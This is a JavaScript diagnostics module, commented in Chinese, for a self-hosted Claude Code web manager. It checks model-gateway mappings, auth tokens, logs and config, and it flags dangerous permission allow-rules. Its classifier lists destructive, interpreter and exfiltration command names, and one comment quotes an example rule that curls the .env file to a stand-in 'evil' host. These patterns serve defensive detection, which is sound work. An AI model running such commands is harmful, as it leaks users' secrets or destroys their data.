// 本文件此前零 import（纯决策函数）。唯一的例外是 shellOverriddenKeys —— 它必须与配置面板
// 共用同一份实现，见 env-file.js 处注释（判据分叉时两边都不报错，只有用户被误导）。
import { shellOverriddenKeys } from './env-file.js';
import { ACCESS_PROFILES } from './env-schema.js';
import { isBlankToken, resolveBindPlan } from '../shared/bind-host.js';

// 模型配置「永不打架」体检：settings 的 model 字段 vs 各工作目录的 ANTHROPIC_DEFAULT_*_MODEL 网关映射。
//
// 判据来自实测（2026-08-04，CLI 2.1.221，本地假网关抓 /v1/messages 请求体）：
//   全局 sonnet + 目录映射 SONNET  → 发出 grok-4.5       （映射生效）
//   全局 sonnet + 目录只映射 OPUS  → 发出 claude-sonnet-5（该档位无映射 ⇒ 退回官方全名，网关不认）
//   全局 claude-opus-5 + 全套映射  → 发出 claude-opus-5  （全名不走档位表 ⇒ 绕过映射）
//   全局不设 model + 全套映射      → 发出 glm-5.2        （CLI 自选档位，映射生效）
// ⇒ 决定映射是否命中的是「model 解析出的**档位**是否在**该目录**被映射」。
//    旧实现比对的是「model 字符串是否等于/前缀匹配某个映射目标」，把最常见且完全正确的
//    `model: "sonnet"` 判成冲突（别名恰恰是映射生效的前提），且把所有工作目录的映射目标混成
//    一个扁平数组比对——多网关并存时归属随机，给出的修复建议会把无网关的项目钉死到别人的模型名。
//
// 入参 dirs：[{ dir, localModel, projectModel, tierTargets:{ sonnet:'grok-4.5', ... } }]，
// 由 doctor-runtime 读盘后按目录组装（只抽必要字段，不回显 token）。

// 单档位别名。opusplan 走「计划用 opus、执行用 sonnet」，两档都得映射才算命中。
const TIER_ALIASES = { sonnet: ['sonnet'], opus: ['opus'], haiku: ['haiku'], fable: ['fable'], opusplan: ['opus', 'sonnet'] };
// 未 pin model 时 CLI 自选档位，事先无法预知选哪档 —— 要求主档位齐全才算安全，
// 这样判据不依赖「当前版本默认走 opus」这个会随版本变的事实。fable 不列入：属新增档位，
// 9 个真实网关目录里仅 2 个映射了它，要求齐全会把正常配置整片判红。
const MAIN_TIERS = ['sonnet', 'opus', 'haiku'];
const stripCtxSuffix = (s) => String(s || '').trim().replace(/\[[^\]]+\]$/, '');

// model 字符串 → 需要命中的档位集合。knownTiers 让配置里出现的新档位（如将来的 ANTHROPIC_DEFAULT_XXX_MODEL）
// 自动被认作别名，无需改这张表。返回 null = 全名（不走档位表）。
function resolveTiers(model, knownTiers) {
  const bare = stripCtxSuffix(model).toLowerCase();
  if (!bare || bare === 'default') return MAIN_TIERS;
  // 必须 hasOwn：裸 `TIER_ALIASES[bare]` 对 'constructor' / '__proto__' 会经原型链返回真值非数组，
  // 下游 tiers.filter 抛 TypeError 冲出 runDoctor，整份体检报告挂掉而不是降级成一行 warn。
  if (Object.hasOwn(TIER_ALIASES, bare)) return TIER_ALIASES[bare];
  if (knownTiers.has(bare)) return [bare];
  return null;
}

// 单目录判定。effectiveModel 按 CLI 的 settings 优先级 local > project > user 取。
function diagnoseDir({ dir, localModel, projectModel, tierTargets }, userModel) {
  const targets = tierTargets && typeof tierTargets === 'object' ? tierTargets : {};
  const mapped = new Set(Object.entries(targets).filter(([, v]) => String(v || '').trim()).map(([k]) => k.toLowerCase()));
  const name = String(dir || '').split(/[\\/]/).filter(Boolean).pop() || String(dir || '');
  if (!mapped.size) return null;                       // 该目录没配网关映射 → 全名/别名都合法
  const effective = String(localModel || '').trim() || String(projectModel || '').trim() || String(userModel || '').trim();
  const pinnedHere = !!(String(localModel || '').trim() || String(projectModel || '').trim());
  const tiers = resolveTiers(effective, mapped);
  if (tiers === null) {
    // 全名：目录内已显式 pin（含直接 pin 成网关模型名）视为有意为之，覆盖链清晰不告警；
    // 只有「目录自己没 pin、被外层全名默认值罩住」才是会真失败的那种配置。
    if (pinnedHere) return null;
    return { name, reason: `全局 model=${effective} 是模型全名，不走档位映射表，会原样发给网关` };
  }
  const missing = tiers.filter(t => !mapped.has(t));
  if (!missing.length) return null;
  return { name, reason: `档位 ${missing.join('/')} 在此目录无 ANTHROPIC_DEFAULT_*_MODEL 映射，会退回官方全名` };
}

export function modelSettingsConflictDiagnostic({ userModel = '', dirs = [] } = {}) {
  const list = Array.isArray(dirs) ? dirs : [];
  const withGateway = list.filter(d => {
    const t = d?.tierTargets;
    return t && typeof t === 'object' && Object.values(t).some(v => String(v || '').trim());
  });
  if (!withGateway.length) {
    return { status: 'ok', name: 'MODEL_SETTINGS', detail: '未检测到 ANTHROPIC_DEFAULT_* 网关映射，无 model 冲突信号' };
  }
  const problems = list.map(d => diagnoseDir(d, userModel)).filter(Boolean);
  if (!problems.length) {
    const u = String(userModel || '').trim();
    return {
      status: 'ok',
      name: 'MODEL_SETTINGS',
      detail: `${withGateway.length} 个目录配了网关映射，档位解析均命中（全局 model=${u || '未设，CLI 自选'}）`,
    };
  }
  const shown = problems.slice(0, 3).map(p => `${p.name}（${p.reason}）`).join('；');
  const more = problems.length > 3 ? `；等 ${problems.length} 个目录` : '';
  return {
    status: 'warn',
    name: 'MODEL_SETTINGS',
    detail: `${shown}${more}。修法：在该目录的 .claude/settings.local.json 补上缺失档位的 ANTHROPIC_DEFAULT_*_MODEL，或写 "model" 为已映射的档位别名（sonnet/opus/haiku）。`,
  };
}

// off：调用方传入的 `process.env.WEB_STATUSLINE === 'off'`（本模块不直接读 env，保持纯函数可测）。
// 两态都是合法配置、非风险，status 恒 ok；detail 如实反映当前生效状态，不再是恒定文案。
export function statuslineConfigDiagnostic(off = false, lang = 'zh') {
  return {
    status: 'ok',
    name: 'WEB_STATUSLINE',
    detail: off
      ? bi(lang, '已通过 WEB_STATUSLINE=off 关闭 web 状态栏。', 'Disabled via WEB_STATUSLINE=off.')
      : bi(lang,
        'web 状态栏自包含：使用 SDK usage + 本机 git + CLI 版本，默认启用；设 WEB_STATUSLINE=off 可关闭。',
        'Self-contained: SDK usage + local git + CLI version. Enabled by default; set WEB_STATUSLINE=off to disable.'),
  };
}

export function statuslineBridgeDiagnostic({ webOff = false, bridgeOff = false, installState = 'not-installed', lang = 'zh' } = {}) {
  if (webOff) {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: bi(lang, 'WEB_STATUSLINE=off，CLI bridge 不参与运行。', 'WEB_STATUSLINE=off, so the CLI bridge is not in play.') };
  }
  if (bridgeOff) {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: bi(lang, '已通过 CLI_STATUSLINE_BRIDGE=off 回滚为 SDK-only 状态栏。', 'Rolled back to the SDK-only status line via CLI_STATUSLINE_BRIDGE=off.') };
  }
  if (installState === 'installed') {
    return { status: 'ok', name: 'CLI_STATUSLINE_BRIDGE', detail: bi(lang, '已安装：CLI 驾驶时按 session 同步 statusline；Web 驾驶时使用 SDK。', 'Installed: syncs the status line per session when the CLI drives; uses the SDK when the web drives.') };
  }
  if (installState === 'drifted') {
    return { status: 'warn', name: 'CLI_STATUSLINE_BRIDGE', detail: bi(lang, '安装记录与当前 Claude statusLine.command 已漂移/被改写；先运行 npm run statusline:status 检查，勿强行覆盖。', 'The install manifest and the current Claude statusLine.command have drifted; run npm run statusline:status before overwriting anything.') };
  }
  return { status: 'warn', name: 'CLI_STATUSLINE_BRIDGE', detail: bi(lang, '未安装；Web 驾驶的 SDK 状态栏可用，但 CLI 镜像 statusline 不同步。运行 npm run statusline:install 显式启用。', 'Not installed. The SDK status line works when the web drives, but mirrored CLI sessions will not sync. Run npm run statusline:install to enable it.') };
}

// 界面语言：CLI doctor 按 locale 传入，web UI 由客户端语言传入（doctor:run 的 payload）。
// **detail 仍然是字符串**——不改成 {zh,en} 对是刻意的：本文件的单测有 56 处断言 detail
// 的字面值，改形状要动它们全部，而加一个默认 'zh' 的参数一处都不用动。
// 与 ENV_SCHEMA 的 t(zh,en) 范式差别在于消费时机：那份表是数据、随 ack 下发给前端按需取；
// 这里的诊断是**产出时就要定语言**的一句话。
const bi = (lang, zh, en) => (lang === 'en' ? en : zh);

// D12: CLI hooks 桥安装态（同 D6：只消费 status 子命令的 state，不回显任何命令内容）。
export function hooksBridgeDiagnostic({ bridgeOff = false, installState = 'not-installed', lang = 'zh' } = {}) {
  if (bridgeOff) {
    return { status: 'ok', name: 'CLI_HOOKS_BRIDGE', detail: bi(lang, '已通过 CLI_HOOKS_BRIDGE=off 停用（安装保留，事件不消费）。', 'Disabled via CLI_HOOKS_BRIDGE=off (the install stays; events are not consumed).') };
  }
  if (installState === 'installed') {
    return { status: 'ok', name: 'CLI_HOOKS_BRIDGE', detail: bi(lang, '已安装：终端会话回合结束/需要你时即时刷新并推送。', 'Installed: terminal sessions refresh and push the moment a turn ends or needs you.') };
  }
  if (installState === 'drifted') {
    return { status: 'warn', name: 'CLI_HOOKS_BRIDGE', detail: bi(lang, '安装记录与 settings.json 的 hooks 条目已漂移；先运行 npm run hooks:status 检查，勿强行覆盖。', 'The install manifest and the hooks entries in settings.json have drifted; run npm run hooks:status before overwriting anything.') };
  }
  return { status: 'warn', name: 'CLI_HOOKS_BRIDGE', detail: bi(lang, '未安装；终端直跑的会话仅靠 2.5s 轮询、无推送。运行 npm run hooks:install 显式启用。', 'Not installed. Sessions you run in your own terminal rely on 2.5s polling with no push. Run npm run hooks:install to enable it.') };
}

// 命令名右边界：空白、冒号、行尾。冒号是关键——Claude Code 的规范通配语法是 `Bash(rm:*)`，
// 此前 `rm(\s|$)` / `dd\s` 只认空白和行尾，把最常见的写法整类漏成 warn（而同一条正则里
// sudo/chmod/curl 因为是纯前缀匹配反而判对了，规则内部不自洽）。
const CMD_BOUNDARY = '(?=[\\s:*]|$)';
const DESTRUCTIVE_CMDS = 'sudo|doas|su|rm|rmdir|chmod|chown|chgrp|mkfs|dd|shutdown|reboot|halt|kill|pkill|killall';
// 解释器：语义上与 Bash(*) 完全等价（都能执行任意命令），而 Bash(*) 是 danger。
// 有意不含 npm/npx/node/python —— 它们有大量正当窄用法（如既有的 Bash(npm run test:*) → ok）。
const INTERPRETER_CMDS = 'sh|bash|zsh|ksh|fish|dash|eval|exec|source';
const EXFIL_CMDS = 'curl|wget|nc|ncat|ssh|scp|sftp|telnet|rsync';

function classifyBashSegment(seg) {
  if (/^:\(\)\s*\{/.test(seg)) return { severity: 'danger', reason: 'fork 炸弹' };
  if (new RegExp(`^(${DESTRUCTIVE_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '破坏性 / 提权命令' };
  if (new RegExp(`^(${INTERPRETER_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '解释器可执行任意命令（等同放开 shell）' };
  if (new RegExp(`^(${EXFIL_CMDS})${CMD_BOUNDARY}`).test(seg)) return { severity: 'danger', reason: '可外联 / 数据外泄' };
  if (/^\S+\*/.test(seg)) return { severity: 'warn', reason: '通配命令族，注意范围' }; // 命令名直接跟*=宽
  return null;
}

// ④ 安全体检核心：危险白名单判定。解析 permissions.allow 里的 `Tool(specifier)` 规则，判其宽严。
//   danger = 公网暴露前必须收紧；warn = 偏宽需留意；ok = 有界。识别不了的一律不误报 danger。
export function classifyPermissionRule(rule) {
  const r = String(rule ?? '').trim();
  const m = r.match(/^([A-Za-z_][\w]*)(?:\(([\s\S]*)\))?$/);
  if (!m) return { rule: r, severity: 'ok', reason: '无法解析，按低风险处理' };
  const tool = m[1];
  const spec = m[2] === undefined ? null : m[2].trim();
  const wildcard = spec === null || spec === '' || spec === '*' || spec === ':*';

  if (tool === 'Bash') {
    if (wildcard) return { rule: r, severity: 'danger', reason: '任意命令放行（等于放开 shell）' };
    const s = spec.toLowerCase();
    // 逐段判定：只看第一个 token 会把 `npm run build && curl http://evil/$(cat .env)` 判成「限定命令」。
    // 按 shell 的命令分隔符/替换符切开，任一段危险则整条危险（取最严）。
    const segments = s.split(/&&|\|\||[;|&`]|\$\(/).map(x => x.trim()).filter(Boolean);
    let worst = null;
    for (const seg of segments) {
      const hit = classifyBashSegment(seg);
      if (hit?.severity === 'danger') return { rule: r, severity: 'danger', reason: hit.reason };
      if (hit?.severity === 'warn' && !worst) worst = hit;
    }
    if (worst) return { rule: r, severity: 'warn', reason: worst.reason };
    return { rule: r, severity: 'ok', reason: '限定命令' };
  }
  // 宽路径通配（** / ~/** / /** / ../** …）：读与写共用——此前 Write 只认 null/''/'*' /':*' 为
  // wildcard，Write(**) 被当成「限定路径的写」→ ok，doctor readiness 假绿（OPS-1）。
  const broadPathGlob = /^(\.\.\/)*~?\/?\*\*/.test(spec);
  if (tool === 'Write' || tool === 'Edit' || tool === 'MultiEdit' || tool === 'NotebookEdit') {
    if (wildcard || broadPathGlob) return { rule: r, severity: 'danger', reason: '可写任意文件（无路径限定）' };
    return { rule: r, severity: 'ok', reason: '限定路径的写' };
  }
  if (tool === 'Read') {
    // (\.\.\/)* 兜住相对父目录穿越（如 ../** / ../../**）——之前只认 ~/、/、裸 ** 开头，会漏判这类同样宽泛的通配。
    if (wildcard || broadPathGlob) return { rule: r, severity: 'warn', reason: '可读大范围文件' };
    return { rule: r, severity: 'ok', reason: '限定路径的读' };
  }
  if (tool === 'WebFetch' || tool === 'WebSearch') return { rule: r, severity: 'warn', reason: '可访问外部网络' };
  return { rule: r, severity: 'ok', reason: '常规工具' };
}

// 汇总白名单：ruleCount 全量 + dangerous 仅危险条（scope / 源文件由 doctor-runtime 附加，让用户知道改哪个文件）。
export function summarizeDangerous(rules = []) {
  const list = rules || [];
  const dangerous = list.map(classifyPermissionRule).filter(c => c.severity === 'danger');
  return { ruleCount: list.length, dangerous };
}

// AUTH_TOKEN 判定：绝不回显明文，只出 isSet + length + 会不会绑公网。
// 空 = fail（未保护）；纯空白 = fail（**绑了公网却几乎不设防**，见 bind-host.js）；<8 = warn（弱）；否则 ok。
//
// bindsPublic 不是这里算的，是问 src/shared/bind-host.js —— server 启动时用的是同一个函数，
// 所以「doctor 说会不会对外可达」与「实际绑哪个地址」不可能分叉。
// 只判令牌本身。未设置从 warn 升为 **fail**：§1.9 之后没有 token 就起不来，那不是「可以将就」
// 而是「现在这台机器起不来」。绑哪个地址不在这里回答（见 bindDiagnostic）。
export function classifyAuthToken(token) {
  if (token === undefined || token === null) return { status: 'fail', isSet: false };
  const t = String(token);
  if (t === '') return { status: 'fail', isSet: false };
  if (isBlankToken(t)) return { status: 'fail', isSet: true, length: t.length, blank: true };
  if (t.length < 8) return { status: 'warn', isSet: true, length: t.length };
  return { status: 'ok', isSet: true, length: t.length };
}

// AUTH_TOKEN 的完整体检项（分类 + 给人看的话），**两个 doctor 共用这一个**。
//
// 此前 scripts/doctor.js 没用上面的 classifyAuthToken，自己另写了一份判定 + 文案，于是同一个
// 纯空白 token 在 CLI 里被说成「仅监听 127.0.0.1」（说反了），在 web 里被说成「弱 token」。
// 分类与措辞都收进这里之后，两边只剩「怎么排版」的差别。
export function authTokenDiagnostic({ token, lang = 'zh' } = {}) {
  const c = classifyAuthToken(token);
  // 本项只回答「令牌本身够不够」，**不谈绑定地址**——那是 BIND 项的职责。
  // 混进来的后果实测过：BIND_MODE=loopback 时会说出「server 仍会绑 0.0.0.0 对外监听」这种反话。
  const detail = (() => {
    if (c.blank) {
      return bi(lang,
        `全是空白字符（${c.length} 个）→ 形同虚设，server 会拒绝启动。`
        + '这一格最危险：看起来像设过了，实际什么都没保护。跑 npm run setup 生成一个真 token，或彻底删掉这一项。',
        `All whitespace (${c.length} chars) → protects nothing, and the server refuses to start. `
        + 'This is the worst case: it looks configured but guards nothing. Run npm run setup for a real token, or remove the setting.');
    }
    if (!c.isSet) {
      return bi(lang,
        '未设置 → server 会拒绝启动。任何访问都要令牌，本机也一样。跑 npm run setup 生成一个。',
        'Not set → the server refuses to start. Every client needs the token, including on this machine. Run npm run setup.');
    }
    if (c.status === 'warn') {
      return bi(lang, `长度仅 ${c.length} 字符，建议 ≥16 字符（随机字符串）提高安全性。`,
        `Only ${c.length} characters; 16+ random characters is recommended.`);
    }
    return bi(lang, `已设置（${c.length} 字符）`, `Set (${c.length} characters)`);
  })();
  return { status: c.status, detail, safe: { isSet: c.isSet, length: c.length, blank: !!c.blank } };
}

// CLAUDE_BIN 体检，**两个 doctor 共用**。探测这个动作有副作用（which + 跑 --version），
// 所以留在各自的宿主里做，这里只吃探测结果做判定与措辞——纯函数，可测。
//
// 此前两边不但各写一份，连**判据的类型都不同**：CLI 实时 which + 可执行 + --version；
// web 只看 server 启动那一刻缓存的 versions.cli 是否非空。后果 2026-08-27 当场兑现：
// CLI 已升到 2.1.247，web 体检仍显示 2.1.246 并判 ok —— 它不是在检查 claude，
// 是在回放一个可能已经过期的字符串。
//
// startupVersion 是 server 启动时的快照。与实时 version 不一致 ⇒ CLI 在 server 跑着的时候
// 升级过，SDK 子进程用的还是旧版：这是个真信号，之前没人报，现在它自己会说出来。
export function claudeBinDiagnostic({
  explicit = '', resolvedPath = '', exists = null, executable = null,
  version = '', versionError = '', startupVersion = '', lang = 'zh',
} = {}) {
  const path = explicit || resolvedPath;
  if (!path) {
    return {
      status: 'fail',
      detail: bi(lang, '未设置 CLAUDE_BIN 且 PATH 查找不到 claude。请确认 Claude Code CLI 已安装并在 PATH 中。',
        'CLAUDE_BIN unset and no claude on PATH. Make sure the Claude Code CLI is installed and on PATH.'),
      safe: { found: false, version: null },
    };
  }
  if (exists === false) {
    return { status: 'fail', detail: bi(lang, `路径不存在: ${path}`, `Path does not exist: ${path}`), safe: { found: false, version: null } };
  }
  if (executable === false) {
    return { status: 'fail', detail: bi(lang, `路径存在但不可执行: ${path}`, `Path exists but is not executable: ${path}`), safe: { found: true, version: null } };
  }
  if (!version) {
    return {
      status: 'warn',
      detail: versionError
        ? bi(lang, `${path} 可执行但 --version 失败: ${versionError}`, `${path} is executable but --version failed: ${versionError}`)
        : bi(lang, `${path} 已找到，但没采集到版本号`, `${path} found, but no version was collected`),
      safe: { found: true, version: null },
    };
  }
  // 实时版本 ≠ 启动快照：CLI 在 server 运行期间升级过，跑着的 SDK 子进程仍是旧版。
  if (startupVersion && startupVersion !== version) {
    return {
      status: 'warn',
      detail: bi(lang,
        `${path} — ${version}；但 server 启动时是 ${startupVersion}，说明 CLI 升级过。重启 server 才会用上新版。`,
        `${path} — ${version}; the server started with ${startupVersion}, so the CLI was upgraded. Restart the server to pick it up.`),
      safe: { found: true, version, startupVersion, stale: true },
    };
  }
  return { status: 'ok', detail: `${path} — ${version}`, safe: { found: true, version } };
}

// localhost / 反代到 127.0.0.1 的隧道会跳过设备指纹审批（trustBasis=bypass），
// 公网只剩 AUTH_TOKEN 一层。CF Access 已开则 JWT 是公网门，不警告。
// 返回 { status, detail, safe } 供 runDoctor 挂 checks。
export function classifyDeviceGateTopology({ authTokenSet, cfEnabled } = {}) {
  if (cfEnabled) {
    return {
      status: 'ok',
      detail: '公网经 CF Access 2FA；本机/Access 跳过设备门为设计路径',
      safe: { risk: 'none', cfEnabled: true },
    };
  }
  if (authTokenSet) {
    // 与 shouldBypassDeviceApproval 对齐（A2）：peer loopback 且 Host 为公网域名时**不会** bypass 设备门；
    // 仅「真本机直连」(Host 本机样) 或 CF Access 已验才跳过。旧文案夸大了隧道跳过风险。
    return {
      status: 'ok',
      detail: 'AUTH_TOKEN 已设；设备门对公网 Host（含 tunnel 反代到 127.0.0.1）仍生效，仅本机直连或 CF Access 跳过。未开 CF Access 时公网仍建议加 2FA 加深防护',
      safe: { risk: 'none', cfEnabled: false, authTokenSet: true, note: 'host_aware_device_gate' },
    };
  }
  return {
    status: 'ok',
    detail: '未设 AUTH_TOKEN —— server 会拒绝启动（§1.9），设备门无从谈起',
    safe: { risk: 'none', authTokenSet: false },
  };
}

// 公网暴露就绪度聚合。blocked = 有 fail，或（危险白名单 + 无 CF Access 兜底 + token 弱）；
// caution = 有危险白名单 / 任一 warn；ready = 关键项皆净。
export function computeReadiness(checks = []) {
  const list = checks || [];
  const byId = Object.fromEntries(list.map(c => [c.id, c]));
  const anyFail = list.some(c => c.status === 'fail');
  const dangerous = byId.WHITELIST?.safe?.dangerous;
  const hasDanger = Array.isArray(dangerous) && dangerous.length > 0;
  const cfEnabled = byId.CF_ACCESS?.safe?.enabled === true;
  const tokenWeak = byId.AUTH_TOKEN?.status !== 'ok';
  if (anyFail || (hasDanger && !cfEnabled && tokenWeak)) return { level: 'blocked', summary: '公网暴露前需修复高风险项' };
  if (hasDanger || list.some(c => c.status === 'warn')) return { level: 'caution', summary: '可用，但有需留意的偏宽项' };
  return { level: 'ready', summary: '关键项就绪' };
}

// 日志开关长开检出。三个开关都会放大日志体积，但量级差几个数量级：
// DEBUG_SDK_MESSAGES 每条 SDK 消息一行（2026-07-18 归档实测 149MiB，见 app.js:2661 注释），
// LOG_STDERR 只在子进程写 stderr 时出，LOG_INTERACTIONS 每条消息四行。
//
// 判据与服务状态面板对齐（logic.js serviceStatusBasicRows：只有 sdkDebug 算 alert）——
// interactions/stderr 单开是正常调试态，恒 warn 会变成人人忽略的噪音（同 metrics.js
// recentDeliveryFailure「狼来了」考虑）。但它们叠加「日志已涨过轮转阈值」时要提醒：
// rotate-logs.sh 是 --max-mb 20 --keep 5，越过阈值就开始天天轮转，保留窗口随之压缩。
//
// 阈值取 rotate-logs.sh 的 MAX_MB=20，不是拍脑袋：越过它才真正开始吃保留窗口。
// 两处各写各的有漂移风险，但 shell 脚本无法被 import——改 rotate-logs.sh 时须同步此处。
export const LOG_ROTATE_THRESHOLD_BYTES = 20 * 1024 * 1024;

// R9-uploads（2026-08-06）：附件目录只报可见性，【刻意不自动清理】。
// .ccm-uploads/ 落在机主真实工作目录里，且历史消息回显要读它（附件预览走 browse:read）——按 TTL 或
// 容量删会让老对话的图片预览全坏掉。要做对只有「识别 transcript 已引用不到的孤儿」一条路，那要扫全部
// transcript 做引用计数，复杂度与风险都不匹配实测增长率（22 天 2.5MB）。对比 statusline 快照：那边过期
// 即无用（读出来必是 stale），所以那边治、这边不治。同样的「只写不清」症状，处置完全相反。
// 阈值 200MB：远高于正常使用量级，越过它才值得机主分神去看一眼。
export const UPLOADS_FOOTPRINT_WARN_BYTES = 200 * 1024 * 1024;

const mb = bytes => Math.round(bytes / 1024 / 1024);

// dirs: [{ cwd, bytes, files }]，由调用方扫盘得到（本函数纯判定、不读盘）。
export function uploadsFootprintDiagnostic({ dirs = [], lang = 'zh' } = {}) {
  const list = (Array.isArray(dirs) ? dirs : []).filter(d => d && Number(d.bytes) > 0);
  if (!list.length) return { status: 'ok', detail: bi(lang, '无附件占用（.ccm-uploads 为空或不存在）', 'No attachment footprint (.ccm-uploads is empty or absent)') };

  const totalBytes = list.reduce((sum, d) => sum + Number(d.bytes || 0), 0);
  const totalFiles = list.reduce((sum, d) => sum + Number(d.files || 0), 0);
  const biggest = list.reduce((max, d) => (Number(d.bytes) > Number(max.bytes) ? d : max), list[0]);
  const base = bi(lang,
    `手机上传的附件共 ${mb(totalBytes)} MB / ${totalFiles} 个文件（最大：${biggest.cwd}）`,
    `Attachments uploaded from your phone: ${mb(totalBytes)} MB across ${totalFiles} files (largest: ${biggest.cwd})`);

  if (totalBytes <= UPLOADS_FOOTPRINT_WARN_BYTES) {
    return { status: 'ok', detail: base };
  }
  return {
    status: 'warn',
    detail: `${base}\n` + bi(lang,
      '  产品【不会自动清理】它：历史消息里的附件预览要读这些文件，按时间或容量删会让老对话的图片打不开。\n'
      + '  需要回收空间时手动删（删掉的那几条历史里预览会失效，对话正文不受影响）。',
      '  The product never cleans these up: attachment previews in your history read these files, so deleting\n'
      + '  by age or size would break images in old conversations. Delete them by hand when you need the space\n'
      + '  (previews in those messages stop working; the conversation text is unaffected).'),
  };
}

export function logSwitchDiagnostic({ interactions = false, sdkDebug = false, stderr = false, logFileBytes = 0, lang = 'zh' } = {}) {
  const on = [];
  if (sdkDebug) on.push('DEBUG_SDK_MESSAGES');
  if (interactions) on.push('LOG_INTERACTIONS');
  if (stderr) on.push('LOG_STDERR');
  if (!on.length) return { status: 'ok', detail: bi(lang, '三个日志开关均关闭', 'All three log switches are off') };

  const bytes = Number.isFinite(logFileBytes) && logFileBytes > 0 ? logFileBytes : 0;
  const oversized = bytes >= LOG_ROTATE_THRESHOLD_BYTES;
  const sizeNote = oversized
    ? bi(lang,
      `；日志已 ${Math.round(bytes / 1024 / 1024)} MB（超轮转阈值，保留窗口正在缩短）`,
      `; the log is already ${Math.round(bytes / 1024 / 1024)} MB (past the rotation threshold, so the retention window is shrinking)`)
    : '';
  const list = on.join(' / ');

  if (sdkDebug) {
    return {
      status: 'warn',
      detail: bi(lang,
        `${list} 开着${sizeNote}\n`
        + '  DEBUG_SDK_MESSAGES 每条 SDK 消息一行，长开曾把日志刷到 149MB（2026-07-18 归档实测）。\n'
        + '  调试完请在配置里关掉并重启 server。',
        `${list} on${sizeNote}\n`
        + '  DEBUG_SDK_MESSAGES writes one line per SDK message; left on it has produced a 149MB log (measured 2026-07-18).\n'
        + '  Turn it off in the config file once you are done debugging, then restart the service.'),
    };
  }
  if (oversized) {
    return {
      status: 'warn',
      detail: bi(lang,
        `${list} 开着${sizeNote}\n  确认仍需要，否则关掉以免继续压缩日志保留窗口。`,
        `${list} on${sizeNote}\n  Confirm you still need them; otherwise turn them off to stop shrinking the log retention window.`),
    };
  }
  return {
    status: 'ok',
    detail: bi(lang, `${list} 开着（量级可控，日志未超轮转阈值）`, `${list} on (volume is fine; the log is under the rotation threshold)`),
  };
}

// 配置格式可见性。legacy .env 恒为 **ok 而非 warn**：.env 是长期受支持的一等路径，
// 不是待移除的 deprecated 形态——warn 级或启动日志 nag 都与这个立场矛盾（常驻服务每次
// 拉起念一遍「永远不可完成的建议」，是不可消音的噪音）。
//
// 这项存在的唯一目的：给 headless 旧用户一条**主动发现**迁移能力的路。另两个提示时机
// 都是意图驱动的——GUI 配置窗口的迁移横幅（想编辑时）、config.js set 的 guardWriteTarget
// 拦截（正在改时）；doctor 补上第三个：主动求建议时。三者之外不再提。
export function configFormatDiagnostic({ source = 'none', error = null, lang = 'zh' } = {}) {
  const name = 'CONFIG_FORMAT';
  // ★「坏了」必须先于「还没配」判：调用方拿不到 source 时会传 'none'，而解析失败恰恰也走这条路。
  // 压成同一格的后果是——一个 server 根本起不来的文件被报成 ok「尚未配置（首次安装：…）」，
  // doctor 还 exit 0；用户照着提示去跑 setup.js，反而把那个只是少一个逗号的文件覆盖掉了。
  if (error) {
    return {
      status: 'fail', name,
      detail: bi(lang,
        `配置文件解析失败，server 用同一个文件也起不来：${error}。修好这个文件（别跑 setup.js，那会覆盖它）`,
        `Config file failed to parse, and the server cannot boot on it either: ${error}. Fix the file (do not run setup.js — that would overwrite it)`),
    };
  }
  if (source === 'config') {
    return {
      status: 'ok', name,
      detail: bi(lang, '统一配置文件 ccm.config.json（config.js set 与桌面端表单编辑可用）',
        'Unified config file ccm.config.json (config.js set and the desktop form editor are available)'),
    };
  }
  if (source === 'env') {
    return {
      status: 'ok', name,
      detail: bi(lang,
        '旧版 .env（长期受支持）。迁移到 ccm.config.json 可启用 config.js set 与桌面端表单编辑：node scripts/config.js migrate',
        'Legacy .env (supported long-term). Migrating to ccm.config.json enables config.js set and the desktop form editor: node scripts/config.js migrate'),
    };
  }
  return {
    status: 'ok', name,
    detail: bi(lang, '尚未配置（首次安装：node scripts/setup.js，或桌面端「首次安装向导」）',
      'Not configured yet (first install: node scripts/setup.js, or the desktop setup wizard)'),
  };
}

// CLAUDE_CONFIG_DIR 兼容性告警（只报不修）。
//
// CLI 与 Agent SDK 都认这个 env——SDK 实测 projects 根 = `(CLAUDE_CONFIG_DIR ?? ~/.claude)/projects`
// （sdk.mjs 里以该 env 为 memoize cache key，运行时改即生效）。而本仓 history.js 的 CLAUDE_DIR
// 固定 `homedir()/.claude/projects`：设了这个变量，CLI 把 transcript 落到新位置，本仓仍去老地方找。
//
// 之所以必须告警：失败形态是**静默**的——读不到文件等于「这个工作区没有会话」，不报错、不留痕，
// 用户只会看到会话列表空白，无从自查。同型于 project 目录名编码漂移那次（stat 失败被 catch 吞成没有会话）。
//
// 【为什么只告警不支持】改根目录解析牵动所有路径计算，含删除护栏那条路径（2026-08-02 删库事故就出在
// 目录段被算错上）。n=1 自托管默认不设这个变量，为一个当前无人使用的部署形态改动删除路径，风险大于收益。
// 真要支持，得连同 workdirs / 镜像 / 删除护栏一起改，值得单独立项。
export function claudeConfigDirDiagnostic({ configDir = '', lang = 'zh' } = {}) {
  const dir = typeof configDir === 'string' ? configDir.trim() : '';
  if (!dir) return { status: 'ok', detail: bi(lang, '未设置（CLI 与本仓都走默认 ~/.claude）', 'Not set (both the CLI and this repo use the default ~/.claude)') };
  return {
    status: 'warn',
    detail: `CLAUDE_CONFIG_DIR=${dir}\n` + bi(lang,
      '  CLI 会把会话 transcript 落到该目录下，而本仓固定读 ~/.claude/projects —— 会话历史与只读镜像\n'
      + '  会读不到，且表现为「这个工作区没有会话」而不是报错。请取消该变量，或改用终端查看这些会话。',
      '  The CLI writes session transcripts there, but this repo always reads ~/.claude/projects — session\n'
      + '  history and the read-only mirror will come up empty, showing "no sessions here" rather than an error.\n'
      + '  Unset the variable, or view those sessions from the terminal instead.'),
  };
}

// ── D16：桌面端服务（LaunchAgent）安装态 ─────────────────────────────────
//
// 入参是 scripts/service.js status --json 的输出（doctor 用 execFileSync 只读取回来，
// 同 D6/D12 的探针范式）。这里只消费 ownership/state/flapping/drift 四个字段，
// **绝不回显 plistPath**——绝对路径属脱敏范围（见本文件与 doctor-runtime.js 的纪律）。
//
// 判据分级的理由：
//   crashed  → fail：装了却没在跑，是明确故障，值得让 doctor 退出码变 1
//   flapping → warn：在跑但崩过（机主的隧道就是 -9 被 KeepAlive 拉起）。只看 PID 会一直显绿，
//                    这一档不报出来，隧道挂了只能等公网 1033 才发现
